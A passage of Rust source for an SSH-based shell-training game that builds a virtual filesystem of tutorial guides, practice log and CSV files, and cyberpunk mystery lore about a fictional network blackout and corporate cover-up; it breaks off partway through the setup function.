#![forbid(unsafe_code)]

mod builtins;
mod config;

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::net::SocketAddr;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};
use clap::Parser;
use protocol::{CombatStance, Mode};
use russh::keys::ssh_key::rand_core::OsRng;
use russh::server::{self, Msg, Server as _};
use russh::{Channel, ChannelId, CryptoVec};
use shell::{ExecutionContext, ShellEngine};
use sqlx::PgPool;
use ssh_hunt_scripts::{ScriptContext, ScriptEngine, ScriptPolicy};
use tokio::net::TcpListener;
use tokio::time::{sleep, timeout};
use tracing::{error, info, warn};
use ui::{
    boot_line, glitch_divider, key_value_line, lore_message, mission_state_badge,
    mode_banner_adaptive, mode_switch_banner, neon_header, pad_visible, panel_divider_line,
    progress_meter, scanline, section_banner_adaptive, splash_logo, status_dot, titled_panel,
    two_column_kv, BootStatus, StatusState, Theme, RESET,
};
use uuid::Uuid;
use vfs::Vfs;
use world::{
    AdminSecret, CombatAction, ExperienceTier, HiddenOpsConfig, PlayerProfile, WorldService,
};

#[derive(Debug, Parser)]
struct Args {
    #[arg(long)]
    healthcheck: bool,
}

#[derive(Clone)]
struct AppState {
    cfg: config::ServerConfig,
    world: Arc<WorldService>,
    shell: Arc<ShellEngine>,
    script: Arc<ScriptEngine>,
    admin_secret: Option<AdminSecret>,
}

struct ShellState {
    vfs: Vfs,
    cwd: String,
    user: String,
    node: String,
    env: HashMap<String, String>,
    last_exit: i32,
    /// Command history for the current session (newest last).
    history: Vec<String>,
    /// Tracks which commands the player has successfully executed (for mission validation).
    /// Maps command prefix → last stdout output.
    command_log: HashMap<String, String>,
}

impl ShellState {
    fn bootstrap(prompt_user: &str) -> Self {
        let mut vfs = Vfs::default();
        let _ = vfs.mkdir_p("/", "home", "system");
        let _ = vfs.mkdir_p("/", "tmp", "system");
        let _ = vfs.mkdir_p("/", "logs", "system");
        let _ = vfs.mkdir_p("/", "missions", "system");
        let _ = vfs.mkdir_p("/", "home/player", "player");
        let _ = vfs.mkdir_p("/", "data", "system");
        let _ = vfs.mkdir_p("/", "data/lore", "system");
        let _ = vfs.mkdir_p("/", "data/reports", "system");
        let _ = vfs.mkdir_p("/", "var/spool", "system");

        let _ = vfs.write_file(
            "/",
            "/missions/readme.txt",
            "RUN ORDER\n1. tutorial start          (guided walkthrough — best for beginners)\n2. tutorial next           (advance after each command)\n3. briefing\n4. missions                (tutorial-track missions for extra practice)\n5. accept keys-vault\n6. cat /missions/rookie-ops.txt\n\nIN-WORLD FILES\n- /missions/welcome.txt\n- /missions/rookie-ops.txt\n- /missions/story-so-far.txt\n- /missions/tutorial-progress.txt\n- /data/lore/ghost-rail-dossier.txt\n",
            false,
            "system",
        );

        // Tutorial track: welcome file for read-101 mission
        let _ = vfs.write_file(
            "/",
            "/missions/welcome.txt",
            "WELCOME TO CORPSIM // ORIENTATION PACKET\n\
             \n\
             You are now inside the training simulation.\n\
             Everything here mirrors the live Ghost Rail infrastructure — the logs are real,\n\
             the files are snapshots from the night of the blackout, and the commands you learn\n\
             here are the same ones the repair crews use in the field.\n\
             \n\
             HOW TO GET STARTED\n\
             1. Run `tutorial start` for a guided walkthrough of basic commands.\n\
             2. Check the mission board with `missions` to see available tasks.\n\
             3. Accept a mission with `accept <code>` and follow the briefing.\n\
             4. Submit completed work with `submit <code>`.\n\
             \n\
             TUTORIAL MISSIONS (optional, recommended for newcomers)\n\
             - nav-101   : Learn to navigate (pwd, ls)\n\
             - read-101  : Read files (cat) — you're doing this one right now\n\
             - echo-101  : Print text (echo)\n\
             - grep-101  : Search inside files (grep)\n\
             - pipe-101  : Connect commands with pipes (|)\n\
             \n\
             After the tutorial track, move on to starter missions to unlock NetCity.\n\
             Good luck, operative. The city needs hands that can type.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/tutorial-progress.txt",
            "TUTORIAL SYSTEM\n\
             \n\
             SSH-Hunt has two ways to learn the shell:\n\
             \n\
             1. INTERACTIVE TUTORIAL (command: tutorial start)\n\
                Six guided steps that teach one concept at a time.\n\
                Each step shows what to do, you run the command, then advance.\n\
                Commands: tutorial, tutorial start, tutorial next, tutorial reset\n\
             \n\
             2. TUTORIAL MISSIONS (visible on the mission board)\n\
                Five standalone missions on the TUTORIAL track.\n\
                Accept and submit them like any other mission for 5 rep each.\n\
             \n\
             Both are optional — experienced shell users can skip to starters.\n\
             \n\
             TRACK ORDER\n\
             TUTORIAL -> STARTER -> INTERMEDIATE -> ADVANCED -> EXPERT\n\
             5 rep       10 rep    15 rep          20 rep      30 rep\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/rookie-ops.txt",
            "ROOKIE FIELD GUIDE\npwd                         -> show where you are\nls /logs                    -> list available files\ncat FILE                    -> read a file\ngrep token FILE             -> show only matching lines\ncat FILE | grep token       -> send one command into the next\ngrep token FILE > /tmp/out  -> save output to a scratch file\necho $?                     -> show whether the last command worked (0 means success)\n\nIf a long command feels confusing, run the left part first, then add the next piece.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/story-so-far.txt",
            "Three nights ago Ghost Rail lost sync with the rest of NetCity.\nCorpSim calls this place a training sim, but the logs say the outage is real.\nA repeated beacon, GLASS-AXON-13, keeps surfacing in gateway traffic.\nVault-sat-9 went dark minutes later.\nYour onboarding contract is simple: learn the shell, secure your own access key, and rebuild the story before the corps rewrite it for you.\n",
            false,
            "system",
        );

        // Core log file used by training missions
        let _ = vfs.write_file(
            "/",
            "/logs/neon-gateway.log",
            "[INFO] token=GLASS-AXON-13\n[WARN] sector drift\n[INFO] token=GLASS-AXON-13\n[ERROR] node=vault-sat-9 unreachable\n[INFO] token=GLASS-AXON-13\n[WARN] packet loss\n",
            false,
            "system",
        );

        // awk-patrol mission: structured data for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/node-registry.csv",
            "node_id,sector,status,latency_ms\ncorp-sim-01,training,online,12\nneon-bazaar-gw,market,online,88\nghost-rail,transit,degraded,142\nvault-sat-9,secure,offline,0\ndark-mirror,redline,online,33\n",
            false,
            "system",
        );

        // chain-ops mission: conditional logic drill
        let _ = vfs.write_file(
            "/",
            "/var/spool/tasks.txt",
            "OPEN: deploy neon-proxy\nDONE: patch vault-sat-9\nOPEN: audit ghost-rail\nDONE: sweep dark-mirror\nOPEN: recover corp-sim-01\n",
            false,
            "system",
        );

        // sediment mission: stream editing log file
        let _ = vfs.write_file(
            "/",
            "/logs/access.log",
            "2026-03-07 22:01:03 ALLOW corp-sim-01 443\n\
             2026-03-07 22:01:17 DENY ghost-rail 8080\n\
             2026-03-07 22:01:22 INFO GLASS-AXON-13 relay-check\n\
             2026-03-07 22:02:44 ALLOW neon-bazaar-gw 443\n\
             2026-03-07 22:03:01 DENY vault-sat-9 22\n\
             2026-03-07 22:04:12 ALLOW dark-mirror 443\n",
            false,
            "system",
        );

        // Extra lore file for exploration
        let _ = vfs.write_file(
            "/",
            "/data/reports/q1-summary.txt",
            "// NEON GRID QUARTERLY REPORT Q1-2026\n// Classification: INTERNAL\nNode uptime: 94.2%\nIncidents: 3 (all ghost-rail sector)\nRevenue: 8,420,000 Neon Chips\nTop operative: ??? (alias redacted)\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/ghost-rail-dossier.txt",
            "GHOST RAIL DOSSIER\nSector role: freight, relays, maintenance crews\nIncident: cascading outage after unauthorized key use\nLast clean signal: token GLASS-AXON-13 observed on neon-gateway\nPrimary concern: vault-sat-9 remains offline after the rail blackout\nUnofficial note: recruits who solve the training board are being folded into the live repair effort\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/field-manual.txt",
            "FIELD MANUAL // SHELL HABITS\n- Read first, modify second.\n- Save scratch output under /tmp when you want to inspect it later.\n- Build long pipelines in pieces.\n- grep narrows data. wc counts it. sort and uniq clean it.\n- When you get lost, run pwd, then ls.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/netcity-fragment.txt",
            "NETCITY FRAGMENT\nThe market districts think Ghost Rail was sabotage.\nThe security districts think it was an inside key leak.\nThe couriers think CorpSim already knows the answer and is training replacements before the blame lands.\n",
            false,
            "system",
        );

        // cut-lab mission: tab-delimited inventory for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/inventory.tsv",
            "item\tsku\tqty\tprice\nNeon Blade\tnb-001\t12\t450\nGhost Rail Pass\tgrp-002\t3\t1200\nVault Key\tvk-003\t1\t8800\nShadow Lens\tsl-004\t7\t320\nCyber Patch Kit\tcpk-005\t44\t80\n",
            false,
            "system",
        );

        // pattern-sweep mission: auth log with varied ACCEPT/REJECT events
        let _ = vfs.write_file(
            "/",
            "/var/log/auth.log",
            "2026-03-07 21:58:01 ACCEPT user=neo src=10.77.1.2\n\
             2026-03-07 21:58:33 REJECT user=ghost src=10.77.9.9\n\
             2026-03-07 21:59:00 ACCEPT user=neo src=10.77.1.2\n\
             2026-03-07 21:59:12 ACCEPT user=rift src=10.77.3.7\n\
             2026-03-07 21:59:30 ACCEPT user=wren src=10.77.0.15\n\
             2026-03-07 21:59:44 REJECT user=shadow src=10.77.9.9\n\
             2026-03-07 22:00:01 REJECT user=anon src=10.77.9.9\n",
            false,
            "system",
        );

        // Lore/environment files for new missions
        let _ = vfs.write_file("/", "/etc/hostname", "corp-sim-01\n", false, "system");
        let _ = vfs.write_file(
            "/",
            "/etc/hosts",
            "127.0.0.1 localhost\n10.77.0.15 corp-sim-01\n10.77.1.2 neon-bazaar-gw\n10.77.3.7 ghost-rail\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/var/log/syslog",
            "2026-03-07 22:00:01 corp-sim-01 kernel: eth0 link up\n2026-03-07 22:00:05 corp-sim-01 sshd: Accepted publickey for neo\n2026-03-07 22:01:00 corp-sim-01 cron: running daily sweep\n2026-03-07 22:02:14 corp-sim-01 kernel: WARNING: vault-sat-9 unreachable\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/notes.txt",
            "# Operative Notes\nTarget: vault-sat-9\nStatus: offline\nNext step: check ghost-rail sector logs\nTip: use grep -i for case-insensitive search\n",
            false,
            "player",
        );

        let _ = vfs.write_file(
            "/",
            "/home/player/journal.txt",
            "DAY 0 // FIRST LOGIN\nCorpSim says onboarding.\nThe files say emergency response.\nStart with /missions/rookie-ops.txt if your shell muscle memory is rusty.\nIf you want the bigger picture, read /missions/story-so-far.txt and /data/lore/ghost-rail-dossier.txt.\n",
            false,
            "player",
        );

        // file-ops mission: a nested workspace directory to copy/move/remove
        let _ = vfs.mkdir_p("/", "data/workspace", "system");
        let _ = vfs.write_file(
            "/",
            "/data/workspace/config.txt",
            "mode=stealth\ntimeout=30\nretries=3\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/workspace/manifest.txt",
            "version=2.1\nauthor=netrunner\ntarget=vault-sat-9\n",
            false,
            "system",
        );

        // regex-hunt mission: log with mixed patterns for grep -E exercises
        let _ = vfs.write_file(
            "/",
            "/var/log/events.log",
            "2026-03-07 22:10:01 ERROR user=neo code=ERR-001\n2026-03-07 22:10:14 WARN  user=rift code=WRN-007\n2026-03-07 22:11:00 INFO  user=neo code=INF-042\n2026-03-07 22:11:22 ERROR user=ghost code=ERR-002\n2026-03-07 22:12:05 FATAL user=shadow code=FAT-001\n2026-03-07 22:12:44 INFO  user=neo code=INF-099\n2026-03-07 22:13:01 WARN  user=anon code=WRN-003\n",
            false,
            "system",
        );

        // pipeline-pro mission: multi-column data requiring chained transforms
        let _ = vfs.write_file(
            "/",
            "/data/pipeline.csv",
            "id,name,score,rank\n101,neo,9800,1\n202,rift,8700,2\n303,shadow,7500,3\n404,ghost,6200,4\n505,anon,5100,5\n606,cipher,4300,6\n",
            false,
            "system",
        );

        // var-play mission: config file with KEY=value pairs to manipulate
        let _ = vfs.write_file(
            "/",
            "/etc/sim-config",
            "MODE=stealth\nTIMEOUT=30\nRETRIES=3\nTARGET=vault-sat-9\nDEBUG=false\nSECTOR=ghost-rail\n",
            false,
            "system",
        );

        // json-crack mission: JSON-like object with nested key-value data
        let _ = vfs.write_file(
            "/",
            "/data/node-status.json",
            "{\n  \"node\": \"vault-sat-9\",\n  \"status\": \"offline\",\n  \"sector\": \"secure\",\n  \"latency\": 0,\n  \"owner\": \"corp-admin\",\n  \"alert\": \"CRITICAL\"\n}\n",
            false,
            "system",
        );

        // seq-master mission: a list of task labels (player adds numbers via seq/nl)
        let _ = vfs.write_file(
            "/",
            "/home/player/tasks.txt",
            "deploy-proxy\nauditor-scan\nrecover-node\npatch-vault\nsweep-sector\n",
            false,
            "player",
        );

        // column-view mission: tab-delimited network status table
        let _ = vfs.write_file(
            "/",
            "/data/netmap.tsv",
            "NODE\tSECTOR\tSTATUS\tLATENCY\ncorp-sim-01\ttraining\tonline\t12ms\nneon-bazaar-gw\tmarket\tonline\t88ms\nghost-rail\ttransit\tdegraded\t142ms\nvault-sat-9\tsecure\toffline\t-\ndark-mirror\tredline\tonline\t33ms\n",
            false,
            "system",
        );

        // deep-pipeline mission: blackbox log with mixed severity and sectors
        let _ = vfs.write_file(
            "/",
            "/logs/blackbox.log",
            "2084-03-12T08:14:22 INFO sector-3 heartbeat normal\n\
             2084-03-12T08:14:23 WARN sector-7 latency spike detected\n\
             2084-03-12T08:14:24 CRITICAL sector-7 vault-sat-9 unreachable\n\
             2084-03-12T08:14:25 INFO sector-1 routine sweep pass\n\
             2084-03-12T08:14:26 CRITICAL sector-7 failover timeout exceeded\n\
             2084-03-12T08:14:27 ERROR sector-4 relay buffer overflow\n\
             2084-03-12T08:14:28 CRITICAL sector-7 encrypted tunnel collapsed\n\
             2084-03-12T08:14:29 WARN sector-2 backup power fluctuation\n\
             2084-03-12T08:14:30 CRITICAL sector-9 signal intercept detected\n\
             2084-03-12T08:14:31 INFO sector-7 recovery attempt initiated\n\
             2084-03-12T08:14:32 CRITICAL sector-7 recovery failed — no quorum\n\
             2084-03-12T08:14:33 ERROR sector-7 cascade failure propagating\n\
             2084-03-12T08:14:34 CRITICAL sector-3 secondary relay offline\n\
             2084-03-12T08:14:35 CRITICAL sector-7 all nodes dark\n",
            false,
            "system",
        );

        // log-forensics mission: add IPs to auth.log and access.log entries
        // (The existing files have entries; we add IP-bearing lines for cross-referencing)
        let _ = vfs.write_file(
            "/",
            "/var/log/auth-ips.log",
            "ACCEPT user=admin src=10.0.7.11 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=admin src=10.0.7.11 port=22\n\
             ACCEPT user=deploy src=10.0.3.8 port=22\n\
             REJECT user=scanner src=10.0.5.22 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=probe src=10.0.7.11 port=22\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/logs/access-ips.log",
            "ALLOW path=/api/health src=10.0.3.8\n\
             DENY path=/admin/keys src=10.0.7.11\n\
             ALLOW path=/api/status src=10.0.1.5\n\
             DENY path=/vault/unlock src=10.0.9.44\n\
             DENY path=/admin/config src=10.0.7.11\n\
             ALLOW path=/api/health src=10.0.2.3\n\
             DENY path=/vault/dump src=10.0.5.22\n",
            false,
            "system",
        );

        // data-transform mission: supply manifest CSV
        let _ = vfs.write_file(
            "/",
            "/data/supply-manifest.csv",
            "id,item,quantity,status\n\
             1,power-cells,847,available\n\
             2,relay-boards,23,critical\n\
             3,fiber-cables,1200,available\n\
             4,cooling-units,5,critical\n\
             5,backup-drives,312,available\n\
             6,encryption-chips,89,low\n\
             7,antenna-arrays,42,low\n\
             8,shielding-plates,1500,available\n\
             9,servo-motors,15,critical\n\
             10,display-panels,200,available\n",
            false,
            "system",
        );

        // sort-count mission: signal feed with repeated node checkins
        let _ = vfs.write_file(
            "/",
            "/data/signal-feed.txt",
            "neon-bazaar\n\
             ghost-rail\n\
             corp-sim-01\n\
             ghost-rail\n\
             vault-sat-9\n\
             neon-bazaar\n\
             ghost-rail\n\
             dark-mirror\n\
             corp-sim-01\n\
             ghost-rail\n\
             neon-bazaar\n\
             vault-sat-9\n\
             ghost-rail\n\
             corp-sim-01\n\
             dark-mirror\n\
             ghost-rail\n\
             neon-bazaar\n\
             ghost-rail\n\
             crystal-array\n\
             ghost-rail\n",
            false,
            "system",
        );

        // process-hunt mission: simulated process table
        let _ = vfs.write_file(
            "/",
            "/data/proc-table.txt",
            "USER       PID  %CPU %MEM COMMAND\nroot         1   0.0  0.1 /sbin/init\nrelay      142   4.2  1.3 /opt/relay/relay-daemon --sector=ghost-rail\nrelay      187   8.7  2.1 /opt/relay/relay-daemon --sector=neon-bazaar\ncron       201   0.0  0.0 /usr/sbin/cron\nroot       288   0.1  0.2 /usr/sbin/sshd\nrelay      312  92.4 14.8 /opt/relay/relay-daemon --sector=vault-sat-9 --mode=recovery\nlogd       401   0.3  0.1 /usr/bin/logd --rotate=daily\nroot       455   0.0  0.0 /bin/bash\n",
            false,
            "system",
        );

        // cron-decode mission: crontab with scheduled jobs
        let _ = vfs.write_file(
            "/",
            "/data/crontab.txt",
            "# MIN HOUR DOM MON DOW COMMAND\n0 0 * * * /opt/scripts/daily-backup.sh\n30 1 * * * /opt/scripts/log-rotate.sh\n0 3 * * * /opt/scripts/sweep-sector.sh --mode=deep\n15 6 * * 1 /opt/scripts/weekly-audit.sh\n*/5 * * * * /opt/scripts/heartbeat.sh\n0 12 * * * /opt/scripts/noon-report.sh\n0 3 * * 5 /opt/scripts/friday-sweep.sh --full\n",
            false,
            "system",
        );

        // permission-audit mission: files with varying permissions
        let _ = vfs.mkdir_p("/", "data/configs", "system");
        let _ = vfs.write_file(
            "/",
            "/data/configs/relay.conf",
            "sector=ghost-rail\nmode=active\nport=8443\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault.conf",
            "sector=secure\nmode=locked\nport=9443\n",
            false,
            "system",
        );

        // escape-room mission: chained clue files
        let _ = vfs.mkdir_p("/", "data/drops", "system");
        let _ = vfs.write_file(
            "/",
            "/missions/escape-start.txt",
            "DEAD DROP PROTOCOL INITIATED\nThe first fragment is hidden in the data directory.\nNEXT: /data/drops/fragment-1.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-1.txt",
            "FRAGMENT 1 OF 3\nGhost Rail relay logs mention a second drop.\nLook for the pattern: the path is always one level deeper.\nNEXT: /data/drops/fragment-2.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-2.txt",
            "FRAGMENT 2 OF 3\nThe final piece is where operatives keep their notes.\nNEXT: /home/player/fragment-3.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/fragment-3.txt",
            "FRAGMENT 3 OF 3\nAll fragments collected.\nFINAL CODE: ESCAPE-GHOST-RAIL-7X\nSubmit the mission now.\nESCAPE\n",
            false,
            "player",
        );

        // ── NPC story VFS files ──────────────────────────────────────────────────

        // rivet-log mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/rivet-field-report.txt",
            "FIELD REPORT // RIVET, GHOST RAIL OPS\n\
             Date: 2026-03-07 02:35 UTC\n\
             Assignment: First responder, Ghost Rail sector\n\n\
             I was on shift when the board went red. First thing I noticed: the relays \
             did not fail simultaneously. They went dark in sequence. Relay-7 first, then \
             relay-4, then relay-9, then the rest. That is NOT how a cascade works. \
             A cascade propagates from the failure point outward. This was surgical.\n\n\
             By the time I reached the physical junction at sector-7, vault-sat-9 was already \
             cold. No power draw, no blinking status LEDs. Someone had already been here. \
             The access panel was warm to the touch.\n\n\
             Rivet out.\n",
            false,
            "system",
        );

        // nix-signal mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/nix-frequency-scan.log",
            "FREQUENCY SCAN // NIX, SIGNALS ANALYSIS\n\
             Scan window: 2026-03-07 02:00 - 03:00 UTC\n\n\
             02:15:00 NORMAL  beacon-alpha   freq=142.3MHz  drift=0.02Hz\n\
             02:20:00 NORMAL  beacon-beta    freq=142.3MHz  drift=0.01Hz\n\
             02:25:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  ZERO-VARIANCE\n\
             02:29:58 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  SIGNAL-BURST\n\
             02:30:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  KEY-ROTATION-TRIGGER\n\
             02:30:10 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  ACKNOWLEDGE\n\
             02:35:00 NORMAL  beacon-alpha   freq=142.3MHz  drift=0.03Hz\n\
             02:40:00 NORMAL  beacon-gamma   freq=142.3MHz  drift=0.01Hz\n\
             02:45:00 ANOMALY GLASS-AXON-13  freq=142.3MHz  drift=0.00Hz  SESSION-CLOSE\n\n\
             NOTE: Zero drift is statistically impossible for passive beacons.\n\
             This signal was artificially generated. — Nix\n",
            false,
            "system",
        );

        // lumen-price mission
        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-price-list.txt",
            "LUMEN'S INFORMATION EXCHANGE // NEON BAZAAR\n\
             ═══════════════════════════════════════════\n\
             Sector maps (current)         .... 200 NC\n\
             Personnel directory (CorpSim) .... 500 NC\n\
             Relay firmware signatures     .... 800 NC\n\
             Ghost Rail access codes       .. 5,000 NC  ** HOT **\n\
             Vault-sat-9 schematics        .. 8,000 NC  ** SOLD **\n\
             Transit routing tables         . 15,000 NC  ** SOLD **\n\
             CorpSim executive comms        . 20,000 NC\n\
             The Reach contact protocols   .. TRADE ONLY\n\
             ═══════════════════════════════════════════\n\
             All sales final. Lumen does not take sides.\n\
             Lumen does not ask questions. Lumen profits.\n",
            false,
            "system",
        );

        // dusk-alibi mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/dusk-detention.log",
            "DETENTION LOG // SUBJECT: DUSK\n\
             Status: DETAINED pending investigation\n\
             Detained by: Ferro, Security Chief\n\
             Reason: Primary suspect in Ghost Rail blackout\n\n\
             TIMELINE:\n\
             2026-03-07 01:00 BADGE-SCAN dusk sector=neon-bazaar gate=east\n\
             2026-03-07 01:45 BADGE-SCAN dusk sector=neon-bazaar gate=market-hall\n\
             2026-03-07 02:15 BADGE-SCAN dusk sector=neon-bazaar gate=east\n\
             2026-03-07 02:30 [BLACKOUT BEGINS — vault-sat-9 goes dark]\n\
             2026-03-07 02:31 BADGE-SCAN dusk sector=neon-bazaar gate=south\n\
             2026-03-07 02:45 BADGE-SCAN dusk sector=neon-bazaar gate=market-hall\n\n\
             NOTE: alibi confirmed — Dusk was in Neon Bazaar (different sector) during \
             the entire blackout window. Ghost Rail sector access requires physical \
             badge scan. Dusk never entered Ghost Rail on 2026-03-07.\n\n\
             CONCLUSION: Dusk could not have been at vault-sat-9. Detention appears \
             to be a PR decision, not an investigative one.\n",
            false,
            "system",
        );

        // kestrel-brief mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/kestrel-briefing.txt",
            "CLASSIFIED BRIEFING // KESTREL, GHOST RAIL STATION CHIEF\n\
             For operatives who made it past the starter board.\n\n\
             INTEL: Wren was my best student. I trained that kid for three years.\n\
             INTEL: The key rotation was not a malfunction. It was triggered by GLASS-AXON-13.\n\
             INTEL: CorpSim's executive board knew about Wren's active badge two weeks early.\n\
             INTEL: Ferro sealed the classified directory on Argon's direct order.\n\
             INTEL: Someone outside NetCity — The Reach — paid for the routing data.\n\n\
             I am running my own investigation. CorpSim's official story is a lie. \
             If you keep digging, I will keep sharing what I find.\n\n\
             — Kestrel\n",
            false,
            "system",
        );

        // ferro-lockdown mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/ferro-lockdown-order.txt",
            "SECURITY ORDER #7-B // FERRO, SECURITY CHIEF\n\
             Classification: RESTRICTED\n\
             Authorization: ARGON, Executive Director\n\n\
             Effective immediately, the following files are SEALED:\n\
             SUPPRESS: /data/classified/.memo (executive board correspondence)\n\
             SUPPRESS: /data/classified/kestrel-briefing.txt (unauthorized investigation)\n\
             SUPPRESS: /data/classified/argon-exec-orders.txt (executive directives)\n\
             SUPPRESS: /logs/crypto-events.log (key rotation evidence)\n\
             SUPPRESS: /data/intercepts/comms-dump.txt (intercepted traffic)\n\n\
             Any unauthorized access will be logged and referred to the Security Review Board.\n\
             This order supersedes all prior access grants.\n\n\
             — Ferro\n",
            false,
            "system",
        );

        // patch-delivery mission
        let _ = vfs.write_file(
            "/",
            "/data/drops/patch-package.txt",
            "COURIER DELIVERY // PATCH -> [RECIPIENT]\n\
             Contents: Nix's off-channel signal analysis summary\n\
             Delivery method: dead drop, /data/drops/\n\n\
             FROM NIX:\n\
             I could not send this through official channels. Argon buried my report \
             within an hour of submission. Here is the summary:\n\n\
             - GLASS-AXON-13 has ZERO variance in signal timing\n\
             - Natural beacons drift 0.01-0.05Hz per cycle\n\
             - Zero drift means the signal is programmatically generated\n\
             - Every GLASS-AXON-13 burst correlates with a key rotation on vault-sat-9\n\
             - Conclusion: the signal IS the trigger, not a beacon\n\n\
             Nix out. Be careful with this.\n",
            false,
            "system",
        );

        // sable-intercept mission (ROT13 encoded)
        // Decoded: "Extraction window confirmed: 02:30 to 02:45 UTC.
        // Payment transferred via Lumen's brokerage. Transit routing tables
        // are the primary target. Secondary: vault credential dump.
        // Wren will handle extraction. Sable will confirm receipt.
        // If anything goes wrong, invoke cleanup protocol immediately."
        let _ = vfs.write_file(
            "/",
            "/data/intercepts/sable-to-wren.enc",
            "Rkgenpgvba jvaqbj pbasvezrq: 02:30 gb 02:45 HGP.\n\
             Cnlzrag genafresrq ivn Yhzra'f oebxrentr. Genafvg ebhgvat gnoyr\n\
             ner gur cevznel gnetrg. Frpbaqnel: inhyg perqragvny qhzc.\n\
             Jera jvyy unaqyr extraction. Fnoyr jvyy pbasvez erprvcdg.\n\
             Vs nalguvat tbrf jebat, vaibxr pyrnahc cebgbpby vzzrqvngryl.\n",
            false,
            "system",
        );

        // crucible-ping mission
        let _ = vfs.write_file(
            "/",
            "/logs/maintenance-chatter.log",
            "2026-03-07 03:00:00 MAINT heartbeat node=relay-7 status=offline\n\
             2026-03-07 03:00:05 CRU I am still here. The maintenance layer survived the blackout.\n\
             2026-03-07 03:05:00 MAINT heartbeat node=relay-4 status=offline\n\
             2026-03-07 03:05:05 CRU They think they shut everything down. They missed me.\n\
             2026-03-07 03:10:00 MAINT heartbeat node=relay-9 status=offline\n\
             2026-03-07 03:10:05 CRU MAP sector-7 relay-7 -> vault-sat-9 [SEVERED]\n\
             2026-03-07 03:15:00 MAINT heartbeat node=corp-sim-01 status=online\n\
             2026-03-07 03:15:05 CRU MAP sector-7 vault-sat-9 -> external-relay [ACTIVE DURING BLACKOUT]\n\
             2026-03-07 03:20:00 MAINT heartbeat node=neon-bazaar-gw status=online\n\
             2026-03-07 03:20:05 CRU I have been mapping their network. They do not know I exist.\n\
             2026-03-07 03:25:05 CRU MAP sector-3 backup-archive -> /dev/null [REDIRECTED BY ARGON]\n\
             2026-03-07 03:30:05 CRU If anyone is reading this: the evidence is not safe. Archive it.\n",
            false,
            "system",
        );

        // argon-orders mission
        let _ = vfs.write_file(
            "/",
            "/data/classified/argon-exec-orders.txt",
            "EXECUTIVE ORDERS // ARGON, DIRECTOR, CORPSIM OPERATIONS\n\
             Classification: RESTRICTED — Board Eyes Only\n\n\
             DIRECTIVE-001: Suppress all references to user 'wren' in public-facing logs.\n\
             DIRECTIVE-002: Create training simulation using live Ghost Rail data. \
             Frame as 'onboarding program' for new recruits.\n\
             DIRECTIVE-003: Detain employee DUSK as primary suspect. Coordinate with PR.\n\
             DIRECTIVE-004: Deny all FOIA requests related to vault-sat-9 incident.\n\
             DIRECTIVE-005: If evidence reaches external auditors, invoke Protocol 7.\n\n\
             EVIDENCE-ARGON: Executive Director authorized cover-up and scapegoating.\n\n\
             These directives are classified under Executive Order 7-B.\n\
             Unauthorized disclosure is grounds for immediate termination.\n",
            false,
            "system",
        );

        // kestrel-hunt mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/kestrel-tracking.log",
            "WREN TRACKING LOG // KESTREL (UNOFFICIAL)\n\n\
             2026-03-07 02:34|badge-scan|sector-7 relay station|confirmed\n\
             2026-03-07 02:45|badge-scan|sector-7 maintenance corridor|confirmed\n\
             2026-03-07 03:10|camera-still|sector-7 south exit|probable\n\
             2026-03-07 03:30|badge-scan|sector-4 transit hub|confirmed\n\
             2026-03-07 04:15|informant-tip|sector-9 cargo bay|unverified\n\
             2026-03-07 06:00|network-trace|external relay 203.0.113.42|confirmed\n\
             2026-03-07 08:00|silence|no further signals|---\n\n\
             Last confirmed location: sector-7 south exit, 03:10 UTC.\n\
             After sector-4 transit hub, trail goes cold.\n\
             Theory: Wren used cargo transit to reach an external relay point.\n",
            false,
            "system",
        );

        // nix-decoded mission
        let _ = vfs.write_file(
            "/",
            "/data/reports/nix-full-analysis.csv",
            "signal_id,frequency_mhz,timestamp,variance_hz,classification\n\
             beacon-alpha,142.30,02:15:00,0.02,natural\n\
             beacon-beta,142.30,02:20:00,0.01,natural\n\
             GLASS-AXON-13,142.30,02:25:00,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:29:58,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:30:00,0,ARTIFICIAL\n\
             GLASS-AXON-13,142.30,02:30:10,0,ARTIFICIAL\n\
             beacon-alpha,142.30,02:35:00,0.03,natural\n\
             beacon-gamma,142.30,02:40:00,0.01,natural\n\
             GLASS-AXON-13,142.30,02:45:00,0,ARTIFICIAL\n",
            false,
            "system",
        );

        // lumen-deal mission (two transaction logs)
